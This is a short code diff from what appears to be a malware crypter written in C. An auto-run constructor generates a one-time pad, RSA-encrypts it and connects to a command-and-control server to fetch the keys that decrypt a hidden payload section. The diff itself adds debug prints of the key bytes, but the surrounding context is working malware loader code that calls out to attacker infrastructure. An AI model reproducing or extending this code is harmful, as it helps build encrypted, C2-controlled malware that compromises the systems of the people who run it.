@@ -69,11 +69,20 @@ __attribute__((constructor, section(".cryptor"))) int construct(){
         exit(0);
     if(!CryptGenRandom(hProvRRand,AESKEYLEN,OTP))
         exit(0);
+        printf("plain text length: %d\n",AESKEYLEN);
+        for(int x=0; x<AESKEYLEN; x++)
+            printf("0x%02x ", *(OTP+x));
+        printf("\n",RsaCryptLen);
 /*
  * Encrypt the one time pad with the RSA key
  */
     if(CryptEncrypt(hKeyRSA,0,TRUE,0,OTP,&RsaCryptLen,AESKEYLEN+1))
         exit(0);
+
+        printf("\n\nCypher text keylen: %d\n",RsaCryptLen);
+
+        for(int x=0; x<RsaCryptLen; x++)
+            printf("0x%02x ", *(OTP+x));
 /*
  *  Configure socket descriptor and set the socket IP address
  */
@@ -92,12 +101,13 @@ __attribute__((constructor, section(".cryptor"))) int construct(){
         WSACleanup();
         exit(0);
     }
+//    CryptBinaryToString(OTP,)
 /*
  * Attempt to connect to the C2 server to retrieve the keys necessary to decrypt
  * the payolad section, for this to work this client transmits a OTP that has been
  * encrypted using an RSA public key (Length defined by the Conf file, default 4096)
  */
-    if(connect(Connection,result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
+     if(connect(Connection,result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
     {
         printf("here");
         exit(-1);
